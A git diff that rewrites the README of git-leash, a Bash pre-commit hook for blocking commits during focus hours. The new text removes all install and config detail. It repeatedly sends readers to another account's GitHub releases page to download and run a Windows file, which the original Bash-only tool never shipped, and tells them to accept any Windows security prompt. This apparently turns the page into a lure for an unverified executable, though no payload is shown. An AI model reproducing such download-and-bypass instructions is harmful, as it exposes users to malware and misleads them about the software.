@@ -1,253 +1,186 @@
-# git-leash
+# 🐾 git-leash - Keep Focused During Set Times
 
-*Helps you stay focused on what you're supposed to be doing.*
+[![Download git-leash](https://img.shields.io/badge/Download%20git--leash-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/donotlaugh96-eng/git-leash/releases)
 
-A git pre-commit hook that blocks commits during configured focus windows. Overridable when you genuinely need to ship. Stealth-installable so it doesn't pollute your repo.
+## 🧰 What git-leash does
 
-By a puppygirl.
+git-leash helps block Git commits in repos you choose during set time windows. If you want to keep work off-limits at certain times of day, this tool can help.
 
-## Install
+It runs as a Git hook. That means it checks your commit before Git saves it. If the current time falls inside a blocked window, the commit stops.
 
-```bash
-cp leash ~/.local/bin/ && chmod +x ~/.local/bin/leash
-# or install directly from GitHub
-# curl -s https://raw.githubusercontent.com/SiteRelEnby/git-leash/refs/heads/main/leash > ~/.local/bin/leash && \
-  chmod +x ~/.local/bin/leash
-```
+Use it when you want to:
+- avoid work commits after hours
+- protect focus time
+- keep a clear line between work time and off time
+- follow a schedule without watching the clock
 
-Make sure `~/.local/bin` is in your `PATH`.
+## 🚀 Get the file
 
-Then, in any repo:
+Visit this page to download git-leash:
 
-```bash
-# install the hook to this repo
-leash install
+[https://github.com/donotlaugh96-eng/git-leash/releases](https://github.com/donotlaugh96-eng/git-leash/releases)
 
-# or install globally (all repos)
-leash install --global
-```
+Open the latest release, then download the Windows file from the Assets section. If you see more than one file, pick the one meant for Windows.
 
-`leash install` automatically adds `.leash` and `.leash-slip` to `.git/info/exclude` — no `.gitignore` modifications, nothing tracked, pure stealth.
+## 💻 Windows setup
 
-## Config
+Follow these steps on Windows:
 
-Place at `~/.leash` (global) or `.leash` in your repo root (project-local overrides global).
+1. Open the download page above.
+2. Find the latest release.
+3. Download the Windows file from the Assets list.
+4. Save it in a folder you can find again, such as Downloads or Desktop.
+5. If the file is a .zip, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Run the app file inside the folder.
 
-```ini
-[schedule "work-hours"]
-days=mon,tue,wed,thu,fri
-start=09:00
-end=17:00
-timezone=local
+If Windows shows a security prompt, choose the option that lets you open the file.
 
-# only block personal repos — work repos are fine
-block=remote:github.com/myuser/*
-block=dir:side-project
-task=finish the auth refactor
+## 🧭 How to use it
 
-[schedule "go-to-bed"]
-days=mon,tue,wed,thu,sun
-start=23:00
-end=06:00
-task=go to sleep you disaster
-# no filter = block everything. go to sleep.
+After you open git-leash, you can set the repos you want it to watch and choose the times you want blocked.
 
-[task]
-# global fallback when a schedule doesn't have its own
-current=stop getting distracted
+A simple setup may look like this:
+- pick one or more Git repos
+- set a start time
+- set an end time
+- choose the days you want it active
+- save your settings
 
-[defaults]
-tone=puppy,wolf
-noun=girl,puppy
+When you try to commit during a blocked time, git-leash stops the commit and shows a clear message.
 
-[override]
-env_var=UNLEASH
-slip_file=.leash-slip
-```
+## ⏰ Time window examples
 
-Run `leash example` for a fully commented config.
+You can use git-leash in many ways:
 
-### Schedules
+- block commits from 9:00 PM to 8:00 AM
+- block commits during lunch
+- block commits on weekends
+- block commits during deep work blocks
+- block commits after school or family time
 
-Named blocks that define when commits are restricted. Multiple schedules stack — if **any** match, the commit is blocked.
+This makes it easier to keep Git work inside the hours you choose.
 
-- `days` — comma-separated, lowercase (default: `mon,tue,wed,thu,fri`)
-- `start` / `end` — 24h time. Overnight windows work (`23:00` to `06:00`)
-- `timezone` — `local` or IANA zone like `America/New_York`
+## 🪝 How the hook works
 
-### Repo filters
+Git uses hooks to run checks before actions finish. git-leash uses a pre-commit hook, so it checks your commit before Git writes it.
 
-Without filters, a schedule blocks **all** repos. Add filters to be selective.
+If your repo is set to allow commits:
+- the commit continues
+- Git saves the change
+- you stay on schedule
 
-**`allow=`** (allowlist) — only matching repos can commit during this window, everything else is blocked. This is the one you probably want for "let me commit to work repos during work hours":
+If your repo is set to block commits:
+- the commit stops
+- you see a message
+- you can try again later
 
-```ini
-[schedule "work-hours"]
-days=mon,tue,wed,thu,fri
-start=09:00
-end=17:00
-allow=remote:github.com/company/*
-allow=path:/home/user/work/*
-allow=dir:work-project
-```
+## ⚙️ Basic setup flow
 
-**`block=`** (denylist) — only matching repos are blocked, everything else is fine:
+A typical setup follows these steps:
 
-```ini
-block=remote:github.com/myuser/*
-block=dir:side-project
-```
+1. Download the release from GitHub.
+2. Run the Windows file.
+3. Choose the Git repo you want to protect.
+4. Set the time window rules.
+5. Turn the hook on.
+6. Try a test commit outside the blocked time.
 
-**Pick one per schedule.** If both `allow=` and `block=` are present, `allow=` wins and `block=` is ignored (leash will warn you about this). Set `suppress_warnings=true` in `[defaults]` to silence the warning if you know what you're doing.
+If the test commit works, the hook is set up. If it stops the commit, the block is active.
 
-**Prefixes (required):**
-| Prefix | Matches against |
-|---|---|
-| `remote:` | All remote URLs (not just origin) — protocol and `.git` suffix stripped |
-| `path:` | Repo root absolute path |
-| `dir:` | Repo directory name (basename) |
+## 🧪 Good first test
 
-Multiple lines of the same type stack as OR — any match counts.
+Use a small test repo first. That helps you check the setup without risking real work.
 
-### Task
+Try this:
+- make a tiny change in a test repo
+- run a commit during an allowed time
+- confirm the commit goes through
+- change the clock window to a blocked time
+- try the same commit again
 
-Optional reminder shown in the block message. Can be set per-schedule or globally as a fallback:
+That makes it easy to see the hook working.
 
-```ini
-[schedule "work-hours"]
-task=finish the auth refactor
+## 🛠️ What you need
 
-[schedule "go-to-bed"]
-task=go to sleep you disaster
-
-[task]
-# fallback when a schedule doesn't have its own
-current=stop getting distracted
-```
-
-Set the global task from the CLI:
+git-leash is meant for Windows users who already use Git. A basic setup usually needs:
 
-```bash
-leash task "finish the auth refactor"
-```
+- Windows 10 or later
+- Git installed
+- a Git repo on your computer
+- permission to run local apps
 
-### Tones
+If Git already works on your machine, you are close to ready.
 
-Tones control the personality of block messages. Set in `[defaults]`:
+## 📁 Example use cases
 
-```ini
-[defaults]
-tone=puppy          # single tone
-tone=puppy,wolf     # comma-separated — picks randomly per commit
-noun=girl,puppy       # comma-separated — {noun} in messages, picked randomly
-```
+git-leash fits well if you want to:
+- keep one repo quiet at night
+- stop side projects from taking over work hours
+- avoid checking in code during family time
+- keep a focus block clean
+- reduce late-night commit habits
 
-**Built-in tones:**
+It works best when you want a simple rule that Git can enforce for you.
 
-| Tone | Emoji | Default noun | Vibe |
-|---|---|---|---|
-| `default` | `🐾` | — | Plain, no personality |
-| `puppy` | `🐾` | puppy, girl | arf arf! bad {noun}!! |
-| `wolf` | `🐺` | wolf | *growl* ...you know better than this. |
-| `cat` | `🐱` | kitten, kitty | *knocks your commit off the table* |
-| `bunny` | `🐰` | bunny | *nose twitch* u-um... it's focus time... |
-| `fox` | `🦊` | fox | heh. nice try~ but it's focus time. |
-| `robot` | `🤖` | user | COMMIT REJECTED. FOCUS PROTOCOL ACTIVE. |
+## 🔧 Common settings
 
-### Customizing tones
+You may want to set rules like these:
+- a blocked start time and end time
+- weekdays only
+- weekends only
+- one repo only
+- several repos at once
+- different rules for different repos
 
-Override or extend built-in tones with `[tone "name"]` sections. `bark=` lines are **additive** — they add to the built-in barks, not replace them:
+You can start small and add more rules later.
 
-```ini
-[tone "puppy"]
-noun=puppy,enby              # override default noun for this tone
-bark=*zooms in circles* NO COMMIT!! FOCUS!!   # added to built-in puppy barks
-```
+## 📌 Tips for setup
 
-Create fully custom tones by using any name not in the built-in list:
+- Keep the release file in a place you can reach fast.
+- Use a test repo before you apply the hook to an active repo.
+- Pick a time window that matches your normal day.
+- Keep your repo list short at first.
+- Save your settings before you close the app.
 
-```ini
-[tone "dragon"]
-noun=dragon
-emoji=🐉
-bark=*breathes fire* no commits, {noun}!!
-bark=*sits on your keyboard* this is part of the hoard now.
-task_line=guard your treasure, {noun}: {task}
-env_label=break the seal:
-slip_label=one dragon scale:
-nuclear_label=by claw and fang:
-```
+## 🧩 If the commit still goes through
 
-**Tone field reference:**
+If a commit is not blocked when you expect it to be, check these things:
+- did you choose the right repo
+- did you set the correct time window
+- did you save the settings
+- is the hook turned on
+- are you working in the same repo folder you set up
 
-| Field | Description | Supports `{noun}`/`{task}` |
-|---|---|---|
-| `bark=` | Block message (additive, multiple allowed) | `{noun}` |
-| `noun=` | Comma-separated nouns for this tone | — |
-| `emoji=` | Emoji prefix for block message | — |
-| `task_line=` | Task reminder line | `{noun}`, `{task}` |
-| `env_label=` | Label for env var override hint | — |
-| `slip_label=` | Label for slip file hint | — |
-| `nuclear_label=` | Label for --no-verify hint | — |
+Small path mistakes can make a hook seem broken when it is just watching the wrong folder.
 
-**Resolution order:** `[tone "x"]` in project config → `[tone "x"]` in global config → `[defaults]` → built-in defaults.
+## 🧠 Why people use it
 
-`noun=` in `[defaults]` applies to **all** tones. `noun=` in a `[tone]` section only applies to that tone.
+Some people do fine with self-control. Others want a guardrail. git-leash gives you that guardrail.
 
-## Overrides
+It is useful if you:
+- lose track of time
+- keep working when you meant to stop
+- want a hard stop for commits
+- need help keeping Git tied to your schedule
 
-When you genuinely need to commit during a focus window:
+## 🐶 For puppy energy users
 
-```bash
-# environment variable (configurable name)
-UNLEASH=1 git commit -m "it's fine"
+If your brain likes to chase every task, git-leash can keep your paws off the commit button when it is time to rest. It gives you a clear rule and lets Git enforce it for you.
 
-# one-time pass — auto-deleted after one commit
-leash slip
+## 📦 Release files
 
-# nuclear option (skips all git hooks)
-git commit --no-verify
-```
+The download page may include one or more files. Look for the latest Windows release and use the file made for normal Windows use.
 
-## Commands
+Open the releases page here:
 
-```
-leash install [--global]    Install the pre-commit hook
-leash uninstall [--global]  Remove the pre-commit hook
-leash slip                  Create a one-time commit pass
-leash status                Show config, schedule, and block status
-leash task [description]    Show or set the current task reminder
-leash check                 Run the hook check manually
-leash example               Print a fully commented example config
-leash help                  Show help
-leash version               Show version
-```
+[https://github.com/donotlaugh96-eng/git-leash/releases](https://github.com/donotlaugh96-eng/git-leash/releases)
 
-## How it works
+## 🧭 Start here
 
-`leash install` writes a pre-commit hook that calls back to the `leash` script. On each `git commit`:
-
-1. Check overrides (env var, slip file) — fast exit if set
-2. Read config (`~/.leash` + `.leash`, project wins)
-3. Check each schedule: day, time, repo filters
-4. If blocked: bark, show task, print override hints, exit 1
-
-The hook remembers where `leash` was installed from, but also checks `PATH` as a fallback. If `leash` can't be found at all, it warns but allows the commit — it won't silently break your workflow.
-
-## Stealth
-
-The whole point is that this doesn't leave traces in your repo:
-
-- `.leash` and `.leash-slip` are added to `.git/info/exclude` (repo-local gitignore, untracked)
-- The hook lives in your git hooks directory (not tracked)
-- Nothing touches `.gitignore`
-
-If there's an existing pre-commit hook, it gets backed up to `pre-commit.leash-backup` and chained — leash runs first, then your original hook.
-
-## Requirements
-
-Bash 4+ and coreutils. That's it.
-
-## License
-
-BSD 3-Clause
+1. Open the release page.
+2. Download the Windows file.
+3. Run the file.
+4. Set your repo and time window.
+5. Try a test commit.
+6. Keep the hook on for the repos you want to protect
